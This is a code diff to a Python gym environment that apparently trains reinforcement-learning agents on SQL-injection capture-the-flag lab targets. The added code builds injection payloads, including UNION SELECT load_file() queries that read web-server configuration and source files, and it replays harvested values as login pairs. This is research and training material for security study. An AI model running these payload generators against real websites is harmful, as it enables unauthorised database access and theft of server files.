@@ -5,17 +5,14 @@ Copied from http://incompleteideas.net/sutton/book/code/pole.c
 permalink: https://perma.cc/C9ZM-652R
 """
 
-import math,sys,os
+import sys,os
 sys.path.append(os.path.join(os.path.dirname(__file__), '../../'))
-from typing import Tuple, List, Dict
 import re
 
 import gym
-from gym import spaces, logger
 from gym.utils import seeding
 from ctfsql.env.core import GameState, GameNotRunningError
 
-import math
 import numpy as np
 import requests
 from bs4 import BeautifulSoup
@@ -90,20 +87,44 @@ class CTFSQLEnv(gym.Env):
         self.state.last_command_id = command_id
         self.is_admissible_commands['table'] = False
         self.is_admissible_commands['column'] = False
+        self.is_admissible_commands['set_input_form'] = False
 
         # Process action
         description = ''
-        x = requests.post(self.url, data = {'id': command, 'pw': ''})
+        if ',pass,' in command:
+            split_command = command.split(',pass,')
+            x = requests.post(self.url, data = {'id': split_command[0], 'pw': split_command[1]})
+        else:
+            x = requests.post(self.url, data = {'id': command, 'pw': ''})
         self.state.infos['responce_data'] = x
         if x.status_code == self.responce_success:
             obs = self.regex_feedback_url(x.text)
             if command in obs:
                 description = 'Responce is good but Query is syntactically wrong.'
-            elif 'seccon' in obs:
-                description = 'You got the flag.'
+            elif 'FLAG_' in obs:
+                description = 'You got the flag. Game Clear!'
                 self.state.done = True
                 self.is_admissible_commands['table'] = False
                 self.is_admissible_commands['column'] = False
+                self.is_admissible_commands['input_form'] = False
+                self.is_admissible_commands['file_path'] = False
+            elif 'you want to read the Flag' in obs:
+                description = 'You achieved phpinfo data.'
+                self.is_admissible_commands['table'] = False
+                self.is_admissible_commands['column'] = False
+                self.is_admissible_commands['input_form'] = False
+                if not self.state.set_file_path:
+                    self.is_admissible_commands['file_path'] = True
+            elif ',pass,' in command:
+                description = 'You did not achieve phpinfo data.'
+            elif 'load_file' in command:
+                description = 'Not found the file_path.'
+            elif 'seccon' in obs:
+                description = 'Successfully get the critical info in the database.'
+                self.is_admissible_commands['table'] = False
+                self.is_admissible_commands['column'] = False
+                if not self.state.set_input_form:
+                    self.is_admissible_commands['input_form'] = True
             elif 'COLUMNS' in obs and 'COLUMN_PRIVILEGES' in obs:
                 description = 'Successfully get table names in the database.'
                 if not self.state.get_table_name:
@@ -145,10 +166,10 @@ class CTFSQLEnv(gym.Env):
         self.action_len = len(generate_actions.generate_actions())
 
         # init ctf database by escape type
-        self.escape_type = np.random.randint(0, const.MAX_ESC_TYPE)
+        self.escape_type = np.random.randint(const.MAX_ESC_TYPE)
         self.column_type = np.random.randint(const.MIN_COLUMN_TYPE, const.MAX_COLUMN_TYPE)
-        self.db_config = const.db_config
-        self.init_database()
+        # self.db_config = const.db_config
+        # self.init_database()
 
         # Get the ip address of ctf envirnoment
         self.url = const.URL + 'ctf_{0}/ctf_{0}_{1}.php'.format(self.escape_type + 1, self.column_type)
@@ -158,12 +179,21 @@ class CTFSQLEnv(gym.Env):
         self.syntaxmin = 0 + self.escape_type * 11
         self.syntaxmax = 10 + self.escape_type * 11
 
-        x = requests.get(self.url)
+        # global session
+        session = requests.Session()
+        x = session.get(self.url)
         obs = self.regex_feedback_url(x.text)
         self.state.table_info = {}
         self.state.get_table_name = False
         self.state.get_column_name = False
-        self.is_admissible_commands = {'table': False, 'column': False}
+        self.state.set_input_form = False
+        self.state.set_file_path = False
+        self.is_admissible_commands = {
+            'table': False,
+            'column': False,
+            'input_form': False,
+            'file_path': False
+        }
 
         self.state.infos = {
             'admissible_commands': self.action_space,
@@ -213,8 +243,7 @@ class CTFSQLEnv(gym.Env):
                 columns = columns + "," + str(i)
             action_index = len(self.action_space)
             for table in obs.split(','):
-                if ' ' not in table:
-                # if ' ' not in table and table.islower():
+                if ' ' not in table and table.islower():
                     command = base_column_query.format(escape, columns, table)
                     self.action_space.append(command)
                     self.state.table_info[action_index] = {'table': table, 'column_num': column_num, 'command': command}
@@ -242,7 +271,6 @@ class CTFSQLEnv(gym.Env):
                 if ',' in inputs:
                     query = ''
                     for col in inputs.split(','):
-                        # query = query + str(col) + ", ' ', "
                         if col.islower():
                             query = query + str(col) + ", ' ', "
                     command = base_column_query.format(escape, query[:-7], columns, table)
@@ -250,6 +278,56 @@ class CTFSQLEnv(gym.Env):
                         self.action_space.append(command)
 
             self.state.get_column_name = False
+            return self.action_space
+        elif self.is_admissible_commands['input_form'] and obs is not None:
+            input_lists = []
+            for inputs in re.split('(SEP)',obs):
+                if len(inputs.split()) == 7:
+                    input_list = []
+                    for input in inputs.split():
+                        if not input.isdigit() \
+                            and re.match('^[,](\d{1})$', input) is None \
+                            and re.match('(\d{4})[/.-](\d{2})[/.-](\d{2})$', input) is None \
+                            and re.match('(\d{2})[:](\d{2})[:](\d{2})$', input) is None:
+                            input_list.append(input)
+                    input_lists.append(input_list)
+
+            for lists in input_lists:
+                commands = []
+                for i in range(2):
+                    if i == 0:
+                        for list in lists:
+                            commands.append(list)
+                    else:
+                        for list in lists:
+                            for command in commands:
+                                if not list in command:
+                                    command = command + ',pass,' + list
+                                    if command not in self.action_space:
+                                        self.action_space.append(command)
+
+            self.state.set_input_form = True
+            return self.action_space
+        elif self.is_admissible_commands['file_path'] and obs is not None:
+            escape = ["'", "')", '"', '")'][self.escape_type]
+            file_pathes = [
+                '/var/www/html/' + self.state.infos['url'][len(const.URL):],
+                '/etc/httpd/conf/httpd.conf',
+                '/etc/apache2/apache2.conf',
+                '/user/share/nginx/html/' + self.state.infos['url'][len(const.URL):],
+                '/etc/nginx/nginx.conf'
+            ]
+            columns = "1"
+            for i in range(2, self.column_type):
+                columns = columns + "," + str(i)
+            base_column_query = "{0} UNION SELECT load_file('{1}'),{2}; -- "
+
+            for file_path in file_pathes:
+                command = base_column_query.format(escape, file_path, columns)
+                if command not in self.action_space:
+                    self.action_space.append(command)
+
+            self.state.set_file_path = True
             return self.action_space
         else:
             return self.action_space
